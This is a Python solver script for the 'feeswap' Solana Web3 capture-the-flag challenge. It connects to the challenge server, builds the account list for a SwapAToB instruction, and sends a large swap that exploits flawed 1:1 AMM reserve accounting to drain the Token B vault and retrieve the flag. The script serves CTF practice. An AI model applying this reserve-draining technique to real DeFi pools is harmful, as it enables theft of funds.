#!/usr/bin/env python3
"""
Solver for feeswap (Solana Web3 CTF)
Challenge: feeswap
Target: web3.h7tex.com:42583
Vulnerability: AMM reserve accounting / 1:1 linear swap allows draining entire Token B reserve.
"""
import argparse
import re
import socket
import struct
import sys
import os

# Ensure tools module can be imported
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "..")))
try:
    from tools.scope_guard import safe_connect
except ImportError:
    def safe_connect(h, p, timeout=15):
        s = socket.socket()
        s.settimeout(timeout)
        s.connect((h, p))
        return s

def read_until(s, pattern: bytes) -> str:
    buf = b""
    while pattern not in buf:
        c = s.recv(1)
        if not c:
            break
        buf += c
    return buf.decode("utf-8", errors="ignore")

def solve(host: str, port: int):
    print(f"[*] Connecting to {host}:{port}...")
    s = safe_connect(host, port, timeout=20)

    # 1. Read initial banner containing account keys
    raw = read_until(s, b"num accounts:")
    info = {}
    for line in raw.splitlines():
        if ": " in line:
            k, v = line.split(": ", 1)
            info[k.strip()] = v.strip()

    print("[+] Parsed Challenge Environment:")
    for k, v in info.items():
        print(f"    {k}: {v}")

    if "pool" not in info or "user" not in info:
        print("[-] Missing expected keys in launcher banner.")
        return None

    # 2. Build account list for Ix::SwapAToB
    # Account indices expected by swap():
    # 0: pool (read)
    # 1: authority (read)
    # 2: user (signer, writable)
    # 3: user_src (writable)
    # 4: user_dst (writable)
    # 5: vault_src (writable)
    # 6: vault_dst (writable)
    # 7: mint_src (read)
    # 8: mint_dst (read)
    # 9: token_program (read)
    accounts = [
        ("-r", info["pool"]),
        ("-r", info["authority"]),
        ("sw", info["user"]),
        ("-w", info["user_a"]),
        ("-w", info["user_b"]),
        ("-w", info["vault_a"]),
        ("-w", info["vault_b"]),
        ("-r", info["mint_a"]),
        ("-r", info["mint_b"]),
        ("-r", info["token_program"]),
    ]

    print(f"[*] Sending {len(accounts)} accounts...")
    s.sendall(f"{len(accounts)}\n".encode())
    for meta, pubkey in accounts:
        s.sendall(f"{meta} {pubkey}\n".encode())

    # 3. Instruction data: Ix::SwapAToB { amount: 100_000_000 }
    # Discriminant = 1 (1 byte), amount = 100_000_000 (8 bytes little-endian u64)
    read_until(s, b"ix len:")
    amount = 100_000_000
    ix_data = b"\x01" + struct.pack("<Q", amount)
    print(f"[*] Sending Ix::SwapAToB (amount={amount})...")
    s.sendall(f"{len(ix_data)}\n".encode())
    s.sendall(ix_data)

    # 4. Exit the interaction loop to trigger evaluation
    read_until(s, b"num accounts:")
    print("[*] Terminating instruction loop...")
    s.sendall(b"exit\n")

    # 5. Read evaluation output and flag
    res = b""
    while True:
        try:
            c = s.recv(1024)
            if not c:
                break
            res += c
        except Exception:
            break

    output = res.decode("utf-8", errors="ignore")
    print("[+] Server Output:\n" + output.strip())

    match = re.search(r"H7CTF\{[a-zA-Z0-9_-]+\}", output)
    if match:
        flag = match.group(0)
        print(f"[!] SUCCESS! Flag: {flag}")
        return flag
    return None

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Solver for feeswap")
    parser.add_argument("--host", default="web3.h7tex.com", help="Challenge host")
    parser.add_argument("--port", type=int, default=42583, help="Challenge port")
    args = parser.parse_args()

    solve(args.host, args.port)
